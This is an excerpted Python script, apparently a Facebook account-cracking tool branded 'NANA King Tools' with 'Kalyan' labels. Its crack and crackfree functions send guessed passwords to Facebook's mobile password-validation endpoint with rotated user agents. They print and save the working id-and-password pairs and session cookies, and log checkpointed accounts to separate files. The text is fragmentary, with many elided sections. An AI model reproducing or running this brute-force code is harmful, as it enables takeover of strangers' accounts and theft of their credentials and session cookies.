...
def Kalyanx(fx):
    Kalyanxz = '2023/2024'  # Default value
...
while attemps < 12345677901:
    ...
    if username == 'NANA' and password == 'king':
...
\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[34m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[33m╠══[Author                   • NANA Mitro ]     ║
\x1b[31m╠══[Facebook                 • NANA King ]   ║
\x1b[97m╠══[Github                   • NANA-KING-404 ]   ║
\x1b[34m╠══[Whatsapp                 • 016*******]  ║
\x1b[35m╠══[TOOLS                    •FREE ]         ║
\x1b[33m╠══[VERSION                  •0.1 ]         ║
\x1b[92m╠══[Key:\x1b[0;41mTHIS TOOL FIRE☺️💬♻️     \x1b[0;92m║
\x1b[34m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝'''
os.system('clear')
print(logo)
...
os.system("clear")
print(logo)
os.system('espeak -a 300 " Welcome,   to,  NANA,  King,  Tools"')
pass
...
def menu():
    ...
    print('\x1b[10;92m┣━\x1b[1;97m=============================================')
    Kalyan = input('\x1b[10;92m┗━\x1b[10;92m\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m ')
    os.system('clear')
    print(logo)
    if Kalyan in ['111']:
        login()
...
def passwrd():
    ...
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;94mYOUR OK IDz SAVED\x1b[10;91m • \x1b[10;93m/sdcard/Kalyan•Ok💚.txt')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\x1b[10;97m{bo}[Kalyan•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\x1b[10;92m "),
    sys.stdout.flush()
    ...
    'user-agent': ua2,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[10;95m[Kalyan•Cp] {idf} • {pw}')
                ...
                bo = random.choice([m,k,h,b,u,x])
                print(f'\r\x1b[10;92m[Kalyan•Ok💚] {idf} • {pw} \x1b[10;91m•> \x1b[10;96m{Kalyanx(idf)}\n\x1b[10;93m[🌺] = COOKIES • {kuki}\n ')
                os.system('espeak -a 300 " Kalyan,  Ok,  id"')
                open('OK🖤-Kalyan/'+okc,'a').write(idf+' • '+pw+'\n')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Kalyan-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[{time.strftime("%H:%M")}•Kalyan-Cp] ({idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'''\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;92m[Kalyan•Ok] {idf} • {pw}''')
                os.system('espeak -a 300 " Ok,  Kalyan,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
